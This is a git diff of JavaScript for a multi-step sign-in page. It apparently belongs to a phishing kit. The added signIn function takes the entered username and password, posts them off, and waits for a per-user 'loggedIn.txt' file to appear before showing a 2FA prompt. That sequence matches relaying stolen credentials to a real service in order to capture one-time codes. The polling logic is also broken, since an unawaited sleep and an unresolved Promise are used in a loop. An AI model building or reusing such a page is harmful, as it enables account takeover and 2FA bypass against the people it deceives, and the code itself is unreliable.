@@ -20,16 +20,43 @@ var loadingDiv = document.querySelector(".loading-screen");
 //   //...
 // });
 //create sign in function for the website
-function signIn(event){
-  event.preventDefault();
-
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
-
-  //...
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
 }
 
+signInBtn.addEventListener("click", function(event) {
+  event.preventDefault(); 
+  loadingDiv.style.display = "block";
+  passwordDiv.style.display = "none";
+  removeLoadingDiv();
+});
+
+function signIn(event){
+  //show marching ants
+  const loadingDiv = document.querySelector(".loading-screen-div");
+
+  
+  event.preventDefault();
+  
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  postData(username,password);
+  while( !(fileExists(username+"loggedIn.txt"))){
+    sleep(200);
+  }
+  loadingDiv.style.display = "none";
+  verifyDiv.style.display ="block";
+  //show 2fa screen
+
+}
+
+
 //create function that will check if the user is logged in
+function fileExists(url) {
+  return fetch(url, { method: 'HEAD' })
+    .then(response => response.ok)
+    .catch(() => false);
+}
 
 
 
@@ -104,12 +131,7 @@ nextBtn.addEventListener("click", function(event) {
   emailDiv.style.display = "none";
 });
 
-signInBtn.addEventListener("click", function(event) {
-  event.preventDefault(); 
-  loadingDiv.style.display = "block";
-  passwordDiv.style.display = "none";
-  removeLoadingDiv();
-});
+
 
 let usernameValue = localStorage.getItem("username") || "";
 
